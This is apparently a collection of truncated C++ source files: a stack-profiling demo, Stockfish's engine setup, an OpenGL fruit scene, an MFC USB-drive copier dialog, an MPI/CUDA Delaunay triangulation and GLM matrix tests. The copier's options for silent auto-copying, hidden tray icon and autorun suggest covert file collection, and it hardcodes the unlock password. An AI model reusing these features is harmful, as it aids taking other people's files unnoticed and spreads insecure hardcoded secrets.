busy_wait(2);\n}\n\nvoid func2() {\n    busy_wait(1);\n    func3();\n    busy_wait(2);\n    func4();\n    busy_wait(5);\n}\n\nvoid func1() {\n    busy_wait(1);\n    func2();\n    busy_wait(3);\n    func3();\n    busy_wait(1);\n}\n\nconst char * fileName = \"fiya-cyg-time-measure.txt\";\n\nint main(int argc, char **argv) {\n    func1();\n\n    std::ofstream myfile(fileName);\n    /** Print collapsed stack */\n    my_recorder.to_collapsed_stacks(\n        myfile, \n        [] (std::ostream& os, void* const & l) {\n            Dl_info info;\n            int status;\n            /** Looking up function name instead of pointer. */\n            if (dladdr(l, &info)) {\n                if (info.dli_sname) {\n                    char * demangled_name = abi::__cxa_demangle((info.dli_sname ? info.dli_sname: \"null\"), NULL, NULL, &status);\n                    if (demangled_name) {\n                        os << demangled_name;\n                        free(demangled_name);\n                    } else {\n                        os << info.dli_sname;\n                    }\n                } else {\n                    os << \"unknown2\";\n                }\n            } else {\n                os << \"unknown1\";\n            }\n        },\n         [] (std::ostream& os, const time_value_t& m) {\n            os << std::chrono::duration_cast<std::chrono::microseconds>(m.get_duration()).count();\n        }\n    );\n    myfile.close();\n    std::cout << \"Output written to \" << fileName << \"\\n\";\n    std::cout << \"Open site speedscope.app and drag the file there.\\n\";\n    std::cout << \"If you have Brendan Gregg's \";\n}",
    "/*\n  Stockfish, a UCI chess playing engine derived from Glaurung 2.1\n  Copyright (C) 2004-2024 The Stockfish developers (see AUTHORS file)\n\n  Stockfish is free software: you can redistribute it and/or modify\n  it under the terms of the GNU General Public License as published by\n  the Free Software Foundation, either version 3 of the License, or\n  (at your option) any later version.\n\n  Stockfish is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n  GNU General Public License for more details.\n\n  You should have received a copy of the GNU General Public License\n  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n*/\n\n#include \"engine.h\"\n\n#include <cassert>\n#include <deque>\n#include <iosfwd>\n#include <memory>\n#include <ostream>\n#include <sstream>\n#include <string_view>\n#include <utility>\n#include <vector>\n\n#include \"evaluate.h\"\n#include \"misc.h\"\n#include \"nnue/network.h\"\n#include \"nnue/nnue_common.h\"\n#include \"perft.h\"\n#include \"position.h\"\n#include \"search.h\"\n#include \"syzygy/tbprobe.h\"\n#include \"types.h\"\n#include \"uci.h\"\n#include \"ucioption.h\"\n\nnamespace Stockfish {\n\nnamespace NN = Eval::NNUE;\n\nconstexpr auto StartFEN  = \"rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1\";\nconstexpr int  MaxHashMB = Is64Bit ? 33554432 : 2048;\n\nEngine::Engine(std::string path) :\n    binaryDirectory(CommandLine::get_binary_directory(path)),\n    numaContext(NumaConfig::from_system()),\n    states(new std::deque<StateInfo>(1)),\n    threads(),\n    networks(\n      numaContext,\n      NN::Networks(\n        NN::NetworkBig({EvalFileDefaultNameBig, \"None\", \"\"}, NN::EmbeddedNNUEType::BIG),\n        NN::NetworkSmall({EvalFileDefaultNameSmall, \"None\", \"\"}, NN::EmbeddedNNUEType::SMALL))) {\n    pos.set(StartFEN, false, &states->back());\n    capSq = SQ_NONE;\n\n    options[\"Debug Log File\"] << Option(\"\", [](const Option& o) {\n        start_logger(o);\n        return std::nullopt;\n    });\n\n    options[\"NumaPolicy\"] << Option(\"auto\", [this](const Option& o) {\n        set_numa_config_from_option(o);\n        return numa_config_information_as_string() + \"\\n\" + thread_binding_information_as_string();\n    });\n\n    options[\"Threads\"] << Option(1, 1, 1024, [this](const Option&) {\n        resize_threads();\n        return thread_binding_information_as_string();\n    });\n\n    options[\"Hash\"] << Option(16, 1, MaxHashMB, [this](const Option& o) {\n        set_tt_size(o);\n        return std::nullopt;\n    });\n\n    options[\"Clear Hash\"] << Option([this](const Option&) {\n        search_clear();\n        return std::nullopt;\n    });\n    options[\"Ponder\"] << Option(false);\n    options[\"MultiPV\"] << Option(1, 1, MAX_MOVES);\n    options[\"Skill Level\"] << Option(20, 0, 20);\n    options[\"Move Overhead\"] << Option(10, 0, 5000);\n    options[\"nodestime\"] << Option(0, 0, 10000);\n    options[\"UCI_Chess960\"] << Option(false);\n    options[\"UCI_LimitStrength\"] << Option(false);\n    options[\"UCI_Elo\"] << Option(Stockfish::Search::Skill::LowestElo,\n                                 Stockfish::Search::Skill::LowestElo,\n                                 Stockfish::Search::Skill::HighestElo);\n    options[\"UCI_ShowWDL\"] << Option(false);\n    options[\"SyzygyPath\"] << Option(\"\", [](const Option& o) {\n        Tablebases::init(o);\n        return std::nullopt;\n    });\n    options[\"SyzygyProbeDepth\"] << Option(1, 1, 100);\n    options[\"Syzygy50MoveRule\"] << Option(true);\n    options[\"SyzygyProbeLimit\"] << Option(7, 0, 7);\n    options[\"EvalFile\"] << Option(EvalFileDefaultNameBig, [this](const Option& o) {\n        load_big_network(o);\n        return std::nullopt;\n    });\n    options[\"EvalFileSmall\"] << Option(EvalFileDefaultNameSmall, [this](const Option& o) {\n        load_small_network(o);\n        return std::nullopt;\n    });\n\n    load_networks();\n    resize_threads();\n}\n\nstd::uint64_t Engine::perft(const std::string& fen, Depth depth, bool isChess960) {\n    verify_networks();\n\n    return Benchmark::perft(fen, depth, isChess960);\n}\n\nvoid Engine::go(Search::LimitsType& limits) {\n    assert(limits.perft == 0);\n    verify_networks();\n    limits.capSq = capSq;\n\n    threads.start_thinking(options, pos, states, limits);\n}\nvoid Engine::stop() { threads.stop = true; }\n\nvoid Engine::search_clear() {\n    wait_for_search_finished();\n\n    tt.clear(threads);\n    threads.clear();\n\n    // @TODO wont work with multiple instances\n    Tablebases::init(options[\"SyzygyPath\"]);  // Free mapped files\n}\n\nvoid Engine::set_on_update_no_moves(std::function<void(const Engine::InfoShort&)>&& f) {\n    updateContext.onUpdateNoMoves = std::move(f);\n}\n\nvoid Engine::set_on_update_full(std::function<void(const Engine::InfoFull&)>&& f) {\n    updateContext.onUpdateFull = std::move(f);\n}\n\nvoid Engine::set_on_iter(std::function<void(const Engine::InfoIter&)>&& f) {\n    updateContext.onIter = std::move(f);\n}\n\nvoid Engine::set_on_bestmove(std::function<void(std::string_view, std::stri",
    "#include <GL/glut.h>\n#include <GL/freeglut.h>\nusing namespace std;\n\n\n\n// Struktur untuk transformasi\nstruct Movement\n{\n    float rotateX, rotateY, scale, translateX, translateY;\n} movement;\n\nbool isMoving = true; \nbool showCartesius = true; \nfloat lightPos[] = {0.0f, 20.0f,0.0f, 1.0f}; //Posisi\n\n// Prototipe fungsi\nvoid init3D();\nvoid display();\nvoid createMenu();\nvoid update(int value);\nvoid processMenu(int option);\nvoid drawTable();\nvoid drawPlate();\nvoid drawWatermelonSlice();\nvoid drawOrange();\nvoid handleKeyboard(unsigned char key, int x, int y);\nvoid handleSpecialKeyboard(int key, int x, int y);\n\n\n\n// Fungsi utama\nint main(int argc, char **argv)\n{\n    glutInit(&argc, argv);\n    glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGB | GLUT_DEPTH);\n    glutInitWindowSize(800, 600);\n    glutInitWindowPosition(100, 100);\n    glutCreateWindow(\"Buah-Buahan di Atas Piring\");\n    init3D();\n    glutDisplayFunc(display);\n    createMenu();\n    glutKeyboardFunc(handleKeyboard); // Tangani input keyboard\n    glutSpecialFunc(handleSpecialKeyboard); // Tangani tombol khusus\n    glutTimerFunc(1000 / 60, update, 0);\n    glutMainLoop();\n    return 0;\n}\n\n///////////////////////////////////////////////////BAGIAN SENJA/////////////////////////////////\n// Gambar meja\nvoid drawTable()\n{\n    glColor3ub(139, 69, 19); // Warna coklat untuk meja\n    glPushMatrix();\n    glTranslatef(0.0, -10.0, 0.0);\n    glScalef(1.8, 0.1, 1.0);\n    glutSolidCube(30.0);\n    glPopMatrix();\n\n    float legHeight = 15.0;\n    float legSize = 2.0;\n\n    glPushMatrix();\n    glTranslatef(-13.0, -23.7, 10.0);\n    glScalef(legSize, legHeight, legSize);\n    glutSolidCube(2.0);\n    glPopMatrix();\n\n    glPushMatrix();\n    glTranslatef(13.0, -23.7, 10.0);\n    glScalef(legSize, legHeight, legSize);\n    glutSolidCube(2.0);\n    glPopMatrix();\n\n    glPushMatrix();\n    glTranslatef(-13.0, -23.7, -10.0);\n    glScalef(legSize, legHeight, legSize);\n    glutSolidCube(2.0);\n    glPopMatrix();\n\n    glPushMatrix();\n    glTranslatef(13.0, -23.7, -10.0);\n    glScalef(legSize, legHeight, legSize);\n    glutSolidCube(2.0);\n    glPopMatrix();\n}\n\n// Gambar piring\nvoid drawPlate()\n{\n    glColor3ub(255, 255, 255);\n\n    glPushMatrix();\n    glTranslatef(0.0, -7.5, 0.0);\n    glRotatef(-90.0, 1.0, 0.0, 0.0);\n    glutSolidTorus(1.0, 12.0, 30, 30);\n    glPopMatrix();\n\n    glPushMatrix();\n    glTranslatef(0.0, -7.6, 0.0);\n    glRotatef(-90.0, 1.0, 0.0, 0.0);\n    glutSolidCylinder(12.0, 0.0, 30, 30);\n    glPopMatrix();\n}\n\n/////////////////////////////////////////////////////////////////////////////////////\n\n/////////////////////////////////////////BAGIAN ROSDIANA/////////////////////////////\n// Gambar jeruk\nvoid drawOrange()\n{\n    glColor3ub(255, 165, 0);\n    glutSolidSphere(5.0, 30, 30);\n    glPushMatrix();\n    glColor3ub(139, 69, 19);  \n    glTranslatef(0.0, 4.5, 0.0);\n    glRotatef(-90.0, 1.0, 0.0, 0.0);\n    GLUquadric *stem = gluNewQuadric();\n    gluCylinder(stem, 0.2, 0.1, 1.5, 12, 6);\n    gluDeleteQuadric(stem);\n    glPopMatrix();\n}\n\n// Gambar semangka\nvoid drawWatermelonSlice()\n{\n    glPushMatrix();\n    glColor3ub(255, 0, 0);\n    glRotatef(-90.0, 1.0, 0.0, 0.0);\n    glutSolidCone(5.0, 10.0, 30, 30);\n    glPopMatrix();\n\n    glPushMatrix();\n    glColor3ub(34, 139, 34);\n    glTranslatef(0.0, -0.1, 0.0);\n    glRotatef(-90.0, 1.0, 0.0, 0.0);\n    glutSolidTorus(0.3, 5.0, 30, 30);\n    glPopMatrix();\n}\n\n///////////////////////////////////////////////////////////////////////////////////////\n\n///////////////////////////////BAGIAN SENJA///////////////////////////////////////////\n\n// Gambar sistem kartesius\nvoid drawCartesius()\n{\n    glLineWidth(1.0); \n    glBegin(GL_LINES);\n\n    // Sumbu X (Merah)\n    glColor3f(1.0, 0.0, 0.0);\n    glVertex3f(-40.0, 0.0, 0.0);\n    glVertex3f(40.0, 0.0, 0.0);\n\n    // Sumbu Y (Hijau)\n    glColor3f(0.0, 1.0, 0.0);\n    glVertex3f(0.0, -40.0, 0.0);\n    glVertex3f(0.0, 40.0, 0.0);\n\n    // Sumbu Z (Biru)\n    glColor3f(0.0, 0.0, 1.0);\n    glVertex3f(0.0, 0.0, -40.0);\n    glVertex3f(0.0, 0.0, 40.0);\n\n    glEnd();\n    glLineWidth(1.0); \n}\n////////////////////////////////////////////////////////////////////////////////////////\nvoid display()\n{\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n    glLoadIdentity();\n\n    glLightfv(GL_LIGHT0, GL_POSITION, lightPos);\n\n    glTranslatef(movement.translateX, movement.translateY, -50.0);\n    glRotatef(movement.rotateX, 1.0, 0.0, 0.0);\n    glRotatef(movement.rotateY, 0.0, 1.0, 0.0);\n    glScalef(movement.scale, movement.scale, movement.scale);\n\n    // Tampilkan kartesius hanya jika showCartesius bernilai true\n    if (showCartesius)\n    {\n        drawCartesius();\n    }\n\n    drawTable();\n    drawPlate();\n    \n    // Posisi semangka\n    glPushMatrix();\n    glTranslatef(-4.0, -7.0, 0.0); // Digeser lebih jauh ke kiri\n    drawWatermelonSlice();\n    glPopMatrix();\n\n    // Posisi jeruk\n    glPushMatrix();\n    glTranslatef(5.0, -3.5, 0.0); // Digeser ke kanan\n    drawOrange();\n    glPopMatrix();\n\n    glutSwapBuffers();\n}\n\nvoid init3D()\n{\n    m",
    "\ufeff\n// UDiskCopierDlg.cpp: \u5b9e\u73b0\u6587\u4ef6\n//\n\n#include \"pch.h\"\n#include \"framework.h\"\n#include \"UDiskCopier.h\"\n#include \"UDiskCopierDlg.h\"\n#include \"afxdialogex.h\"\n#include<string>\n#include<vector>\n#include <cstring>\n#include<thread>\n#include <fstream>\n#include \"ConfigSaver.h\" // \u914d\u7f6e\u6587\u4ef6\u5199\u5165\n#include \"ConfigLoader.h\" // \u914d\u7f6e\u6587\u4ef6\u8bfb\u5165\n#include \"Copier.h\" // \u590d\u5236\u529f\u80fd\u7684\u5b9e\u73b0\n#include \"Extension.h\"// \u6269\u5c55\u540d\u76f8\u5e94\u51fd\u6570\n#include\"Unlock.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#endif\n\n#define WM_ICON_NOTIFY  WM_USER+100\n\n// \u7528\u4e8e\u5e94\u7528\u7a0b\u5e8f\u201c\u5173\u4e8e\u201d\u83dc\u5355\u9879\u7684 CAboutDlg \u5bf9\u8bdd\u6846\n\nclass CAboutDlg : public CDialogEx\n{\npublic:\n\tCAboutDlg();\n\n// \u5bf9\u8bdd\u6846\u6570\u636e\n#ifdef AFX_DESIGN_TIME\n\tenum { IDD = IDD_ABOUTBOX };\n#endif\n\n\tprotected:\n\tvirtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV \u652f\u6301\n\n// \u5b9e\u73b0\nprotected:\n\tDECLARE_MESSAGE_MAP()\n};\n\nCAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)\n{\n}\n\nvoid CAboutDlg::DoDataExchange(CDataExchange* pDX)\n{\n\tCDialogEx::DoDataExchange(pDX);\n}\n\n// \u5fc5\u987b\u628a\u83dc\u5355\u8bbe\u6210\u5168\u5c40\u53d8\u91cf\uff0c\u4e0d\u7136\u6bcf\u6b21\u6253\u5f00\u7684\u90fd\u662f\u65b0\u7684\nHMENU hMenu = LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU1)); //\u83dc\u5355\u7684ID\nHMENU hSubMenu = GetSubMenu(hMenu, 0);\nLRESULT CUDiskCopierDlg::OnTrayNotification(WPARAM wParam, LPARAM lParam)\n{\n\t\tswitch (lParam)\n\t\t{\n\t\tcase WM_LBUTTONDOWN://\u70b9\u51fb\u5de6\u952e\uff0c\u8c03\u51fa\u7a0b\u5e8f\n\t\t{\n\t\t\tif (m_LOCK.GetCheck()) {\n\t\t\t\tUnlock UL;\n\t\t\t\tUL.DoModal();//\u663e\u793a\n\t\t\t}\n\t\t\telse {\n\t\t\t\tAfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOWNORMAL);\n\t\t\t\tSetForegroundWindow();\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tcase WM_RBUTTONUP://\u70b9\u51fb\u53f3\u952e\uff0c\u51fa\u73b0\u9009\u62e9\u83dc\u5355\n\t\t{\n\t\t\tif (m_LOCK.GetCheck()) {\n\t\t\t\tUnlock UL;\n\t\t\t\tUL.DoModal();//\u663e\u793a\n\t\t\t}\n\t\t\telse {\n\t\t\t\tPOINT point;\n\t\t\t\tGetCursorPos(&point); //\u9f20\u6807\u4f4d\u7f6e\n\n\t\t\t\tSetForegroundWindow();\n\n\t\t\t\tTrackPopupMenu(hSubMenu, 0,\n\t\t\t\t\tpoint.x, point.y, 0, m_hWnd, NULL);\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\t}\n\t\n\treturn 0;\n}\n\nBEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)\nEND_MESSAGE_MAP()\n\n\n// CUDiskCopierDlg \u5bf9\u8bdd\u6846\n\n\n\nCUDiskCopierDlg::CUDiskCopierDlg(CWnd* pParent /*=nullptr*/)\n\t: CDialogEx(IDD_UDISKCOPIER_DIALOG, pParent)\n{\n\tm_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);\n}\n\nvoid CUDiskCopierDlg::DoDataExchange(CDataExchange* pDX)\n{\n\tCDialogEx::DoDataExchange(pDX);\n\tDDX_Control(pDX, IDC_COMBO2, m_ComBox_black_write);\n\tDDX_Control(pDX, IDC_EDIT1, m_fileExtensions);\n\tDDX_Control(pDX, IDC_EDIT2, m_delay);\n\tDDX_Control(pDX, IDC_EDIT3, m_fileSize);\n\tDDX_Control(pDX, IDC_FolerToU, m_FolderToU);\n\tDDX_Control(pDX, IDC_EDIT4, m_reverseCopyKey);\n\tDDX_Control(pDX, IDC_AUTOCOPY, m_AutoCopy);\n\tDDX_Control(pDX, IDC_HideTray, m_HideTray);\n\tDDX_Control(pDX, IDC_LOCK, m_LOCK);\n\tDDX_Control(pDX, IDC_Unlock, m_UNLOCK);\n\tDDX_Control(pDX, IDC_SplitDirectory, m_splitDirectory);\n}\n\nBEGIN_MESSAGE_MAP(CUDiskCopierDlg, CDialogEx)\n\t\n\tON_WM_SYSCOMMAND()\n\tON_WM_PAINT()\n\tON_WM_QUERYDRAGICON()\n\tON_BN_CLICKED(IDC_BUTTON1, &CUDiskCopierDlg::OnBnClickedButton1)\n\tON_EN_CHANGE(IDC_PATH, &CUDiskCopierDlg::OnEnChangePath)\n\tON_BN_CLICKED(IDC_SHOWFILE, &CUDiskCopierDlg::OnBnClickedShowfile)\n\tON_BN_CLICKED(IDC_SAVE_AND_START, &CUDiskCopierDlg::OnBnClickedSaveAndStart)\n\tON_BN_CLICKED(IDC_CHECK_PICTURE, &CUDiskCopierDlg::OnBnClickedCheckPicture)\n\tON_BN_CLICKED(IDC_CHECK_VIDEO, &CUDiskCopierDlg::OnBnClickedCheckVideo)\n\tON_BN_CLICKED(IDC_CHECK_AUDIO, &CUDiskCopierDlg::OnBnClickedCheckAudio)\n\tON_BN_CLICKED(IDC_CHECK_OFFICE, &CUDiskCopierDlg::OnBnClickedCheckOffice)\n\tON_BN_CLICKED(IDC_CHECK1, &CUDiskCopierDlg::OnBnClickedCheck1)\n\tON_BN_CLICKED(IDC_HIDE_BUTTON, &CUDiskCopierDlg::OnBnClickedHideButton)\n\tON_WM_CLOSE()\n\tON_COMMAND(ID_TRAY_32771, &CUDiskCopierDlg::OnTray32771)\n\tON_COMMAND(ID_TRAY_32772, &CUDiskCopierDlg::OnTray32772)\n\tON_MESSAGE(WM_ICON_NOTIFY, OnTrayNotification)\n\tON_BN_CLICKED(IDC_AUTORUN, &CUDiskCopierDlg::OnBnClickedAutorun)\n\tON_WM_TIMER()\n\tON_BN_CLICKED(IDC_RUN, &CUDiskCopierDlg::OnBnClickedRun)\n\tON_BN_CLICKED(IDC_BUTTON4, &CUDiskCopierDlg::OnBnClickedButton4)\n\tON_BN_CLICKED(IDC_FolerToU, &CUDiskCopierDlg::OnBnClickedFolertou)\n\tON_COMMAND(ID_TRAY_DIRECTORY, &CUDiskCopierDlg::OnTrayDirectory)\n\tON_COMMAND(ID_TRAY_CODER, &CUDiskCopierDlg::OnTrayCoder)\n\tON_COMMAND(ID_TRAY_COURSE, &CUDiskCopierDlg::OnTrayCourse)\n\tON_COMMAND(ID_TRAY_AUTOCOPY, &CUDiskCopierDlg::OnTrayAutocopy)\n\tON_BN_CLICKED(IDC_AUTOCOPY, &CUDiskCopierDlg::OnBnClickedAutocopy)\n\tON_COMMAND(ID_TRAY_HideTray, &CUDiskCopierDlg::OnTrayHidetray)\n\tON_MESSAGE(WM_HOTKEY, OnHotKey)\n\tON_BN_CLICKED(IDC_HideTray, &CUDiskCopierDlg::OnBnClickedHidetray)\n\tON_BN_CLICKED(IDC_LOCK, &CUDiskCopierDlg::OnBnClickedLock)\n\tON_COMMAND(ID_TRAY_LOCK, &CUDiskCopierDlg::OnTrayLock)\nEND_MESSAGE_MAP()\n\n//\u68c0\u6d4b\u5f00\u673a\u81ea\u542f\u7684\u51fd\u6570\nBOOL checkAutoRun(CString startName);\n\n//\u7528\u4e8e\u5f00\u59cb\u590d\u5236\u7684\u51fd\u6570\nvoid startCopy();\n\n//\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u5168\u5c40\u53d8\u91cf\u533a\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\nextern std::string config;\n//\u521b\u5efa\u7528\u4e8e\u521d\u59cb\u5316\u548c\u66f4\u6539\u7684\u7c7b  \u7f6e\u4e3a\u5168\u5c40\u53d8\u91cf\nConfigSaver CS;\n//\u521d\u59cb\u5316\u7c7b   \u4e3a\u5168\u5c40\u53d8\u91cf\nConfigLoader CL;\n\n//\u521d\u59cb\u5316\u7c7b \u6269\u5c55\u540d\nExtension EX;\n//\u83b7\u5f97\u5927\u5c0f\nextern int int_getFileSize;\n//\u83b7\u5f97\u5ef6\u8fdf\u65f6\u95f4\nextern int int_getDelay;\n//\u8bbe\u7f6e\u4fdd\u5b58\u8def\u5f84\nextern CString strFolderPath;\n//mfc\u5e94\u7528\u7a0b\u5e8f\u6240\u5728\u7684\u6587\u4ef6\u5939\nCString mfcPath;\n//\u89e3\u9501\u5bc6\u7801\nCString unlockPassword=_T(\"114514\");\n//\u5206\u6587\u4ef6\u590d\u5236\nextern bool isSplitDir;\n//\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\n\n//\u5728mfc\u521d\u59cb\u5316\u4e2d\u8c03\u7528\u7684\u51fd\u6570\nvoid CUDiskCopierDlg::initAll() {\n\t//\u5728\u6b64\u6dfb\u52a0\u9700\u8981\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u521d\u59cb\u5316\u7684\u64cd\u4f5c\n\n\t//\u521d\u59cb\u5316\u9ed8\u8ba4\u8def\u5f84\n\tGetDlgItem(IDC_PATH)->SetWindowText(CL.init_saveP",
    "#include \"DelaunayTriangulation.h\"\n#include \"./DelaunayTriangulation_kernel.cuh\"\n\n#include <omp.h>  // Include OpenMP header\n#include <algorithm>\n#include <cmath>\n#include <vector>\n#include <mpi.h>\n\n// Point class methods (same as before)\nPoint::Point(float x, float y) : x(x), y(y) {}\n\nstd::vector<float> Point::pos() const {\n    return { x, y };\n}\n\nbool Point::isEqual(const Point& other) const {\n    return (x == other.x && y == other.y);\n}\n\nstd::string Point::pointToStr() const {\n    return \"(\" + std::to_string(x) + \", \" + std::to_string(y) + \")\";\n}\n\nTriangle::Triangle(const Point& a, const Point& b, const Point& c) : a(a), b(b), c(c) {}\n\nbool Triangle::isEqual(const Triangle& other) const {\n    return (a.isEqual(other.a) || a.isEqual(other.b) || a.isEqual(other.c)) &&\n        (b.isEqual(other.a) || b.isEqual(other.b) || b.isEqual(other.c)) &&\n        (c.isEqual(other.a) || c.isEqual(other.b) || c.isEqual(other.c));\n}\n\nstd::vector<float> Graph::circumcircle(const Triangle& tri) const {\n    float D = (tri.a.x - tri.c.x) * (tri.b.y - tri.c.y) - (tri.b.x - tri.c.x) * (tri.a.y - tri.c.y);\n\n    float centerX = (((tri.a.x - tri.c.x) * (tri.a.x + tri.c.x) + (tri.a.y - tri.c.y) * (tri.a.y + tri.c.y)) / 2 * (tri.b.y - tri.c.y) -\n        ((tri.b.x - tri.c.x) * (tri.b.x + tri.c.x) + (tri.b.y - tri.c.y) * (tri.b.y + tri.c.y)) / 2 * (tri.a.y - tri.c.y)) / D;\n\n    float centerY = (((tri.b.x - tri.c.x) * (tri.b.x + tri.c.x) + (tri.b.y - tri.c.y) * (tri.b.y + tri.c.y)) / 2 * (tri.a.x - tri.c.x) -\n        ((tri.a.x - tri.c.x) * (tri.a.x + tri.c.x) + (tri.a.y - tri.c.y) * (tri.a.y + tri.c.y)) / 2 * (tri.b.x - tri.c.x)) / D;\n\n    float radius = std::sqrt(std::pow(tri.c.x - centerX, 2) + std::pow(tri.c.y - centerY, 2));\n\n    return { centerX, centerY, radius };\n}\n\nbool Graph::pointInCircle(const Point& point, const std::vector<float>& circle) const {\n    float d = std::sqrt(std::pow(point.x - circle[0], 2) + std::pow(point.y - circle[1], 2));\n    return (d < circle[2]);\n}\n\nvoid Graph::addPoint(const Point& point) {\n    // Check if point is unique before adding\n    for (const auto& p : points) {\n        if (p.isEqual(point)) {\n            return;  // Equivalent point already exists\n        }\n    }\n    points.push_back(point);\n}\n\n\nvoid Graph::triangulation(float* apoints, int rank, int size, int smSize) {\n    std::vector<Triangle> localTriangles;\n\n    // Split work dynamically among processes (MPI)\n    size_t start, end;\n    size_t numPoints = points.size();\n    size_t pointsPerRank = numPoints / (size + smSize);\n    size_t remainder = numPoints % (size + smSize);\n\n    if (rank == 0) {\n        start = rank * pointsPerRank;\n        end = start + ((smSize + 1) * pointsPerRank);\n    }\n    else {\n        start = ((smSize + rank) * pointsPerRank);\n        end = start + pointsPerRank;\n    }\n    if (size - 1 == rank) {\n        end += remainder;\n    }\n\n\n    if (rank == 0) {\n\n        printf(\"Rank : %d ---------- GPU - Processing points from id : %d to id : %d\\n\", rank, start, end);\n\n        std::vector<std::vector<int>> trianglesCUDA;\n        triangulationCUDA(apoints, numPoints, start, end, trianglesCUDA);\n        std::cout << \"#Triangles generated with GPU: \" << trianglesCUDA.size() << \"\\n\";\n        for (const auto& tri : trianglesCUDA) {\n            Triangle t(Point(apoints[tri[0] * 2], apoints[tri[0] * 2 + 1]), \n                Point(apoints[tri[1] * 2], apoints[tri[1] * 2 + 1]), \n                Point(apoints[tri[2] * 2], apoints[tri[2] * 2 + 1]));\n            localTriangles.push_back(t);\n        }\n\n    }\n    else {\n\n        printf(\"Rank : %d ---------- CPU - Processing points from id : %d to id : %d\\n\", rank, start, end);\n\n        #pragma omp parallel\n        {\n            std::vector<Triangle> threadLocalTriangles;\n\n            #pragma omp for schedule(dynamic)\n            for (size_t i = start; i < end; ++i) {\n                for (size_t j = i + 1; j < numPoints; ++j) {\n                    for (size_t k = j + 1; k < numPoints; ++k) {\n                        if (!areCollinear(points[i], points[j], points[k])) {\n                            Triangle tri(points[i], points[j], points[k]);\n                            if (triangleIsDelaunay(tri)) {\n                                threadLocalTriangles.push_back(tri);\n                            }\n                        }\n                    }\n                }\n            }\n            #pragma omp critical\n            localTriangles.insert(localTriangles.end(), threadLocalTriangles.begin(), threadLocalTriangles.end());\n\n        }\n        printf(\"#Triangles generated with CPU %d: %d\\n\", rank, localTriangles.size());\n    }\n    \n\n    // Serialize local triangles for communication (MPI)\n    size_t localCount = localTriangles.size();\n    std::vector<double> serializedLocalData(localCount * 6);  // 3 points * 2 coordinates each\n    for (size_t i = 0; i < localCount; ++i) {\n        serializedLocalData[i * 6 + 0] = localTriangles[i].a.x;\n        serializedLocalData[i * 6 + 1] = localTriangles[i",
    "#include <glm/gtc/constants.hpp>\n#include <glm/ext/scalar_relational.hpp>\n#include <glm/ext/vector_relational.hpp>\n#include <glm/ext/matrix_relational.hpp>\n#include <glm/matrix.hpp>\n#include <glm/mat4x4.hpp>\n#include <glm/vec4.hpp>\n#include <vector>\n\ntemplate <typename matType, typename vecType>\nstatic int test_operators()\n{\n\ttypedef typename matType::value_type value_type;\n\n\tvalue_type const Epsilon = static_cast<value_type>(0.001);\n\n\tint Error = 0;\n\n\tmatType const M(static_cast<value_type>(2.0f));\n\tmatType const N(static_cast<value_type>(1.0f));\n\tvecType const U(static_cast<value_type>(2.0f));\n\n\t{\n\t\tmatType const P = N * static_cast<value_type>(2.0f);\n\t\tError += glm::all(glm::equal(P, M, Epsilon)) ? 0 : 1;\n\t\t\n\t\tmatType const Q = M / static_cast<value_type>(2.0f);\n\t\tError += glm::all(glm::equal(Q, N, Epsilon)) ? 0 : 1;\n\t}\n\t\n\t{\n\t\tvecType const V = M * U;\n\t\tError += glm::all(glm::equal(V, vecType(static_cast<value_type>(4.f)), Epsilon)) ? 0 : 1;\n\t\t\n\t\tvecType const W = U / M;\n\t\tError += glm::all(glm::equal(W, vecType(static_cast<value_type>(1.f)), Epsilon)) ? 0 : 1;\n\t}\n\n\t{\n\t\tmatType const O = M * N;\n\t\tError += glm::all(glm::equal(O, matType(static_cast<value_type>(2.f)), Epsilon)) ? 0 : 1;\n\t}\n\n\treturn Error;\n}\n\ntemplate <typename matType>\nstatic int test_inverse()\n{\n\ttypedef typename matType::value_type value_type;\n\n\tvalue_type const Epsilon = static_cast<value_type>(0.001);\n\t\n\tint Error = 0;\n\n\tmatType const Identity(static_cast<value_type>(1.0f));\n\tmatType const Matrix(\n\t\tglm::vec4(0.6f, 0.2f, 0.3f, 0.4f),\n\t\tglm::vec4(0.2f, 0.7f, 0.5f, 0.3f),\n\t\tglm::vec4(0.3f, 0.5f, 0.7f, 0.2f),\n\t\tglm::vec4(0.4f, 0.3f, 0.2f, 0.6f));\n\tmatType const Inverse = Identity / Matrix;\n\tmatType const Result = Matrix * Inverse;\n\n\tError += glm::all(glm::equal(Identity, Result, Epsilon)) ? 0 : 1;\n\t\n\treturn Error;\n}\n\nstatic int test_ctr()\n{\n\tint Error = 0;\n\n#if GLM_HAS_TRIVIAL_QUERIES\n\t//Error += std::is_trivially_default_constructible<glm::mat4>::value ? 0 : 1;\n\t//Error += std::is_trivially_copy_assignable<glm::mat4>::value ? 0 : 1;\n\tError += std::is_trivially_copyable<glm::mat4>::value ? 0 : 1;\n\t//Error += std::is_copy_constructible<glm::mat4>::value ? 0 : 1;\n\t//Error += std::has_trivial_copy_constructor<glm::mat4>::value ? 0 : 1;\n#endif\n\n#if GLM_HAS_INITIALIZER_LISTS\n\tglm::mat4 const m0(\n\t\tglm::vec4(0, 1, 2, 3),\n\t\tglm::vec4(4, 5, 6, 7),\n\t\tglm::vec4(8, 9, 10, 11),\n\t\tglm::vec4(12, 13, 14, 15));\n\n\tassert(sizeof(m0) == 4 * 4 * 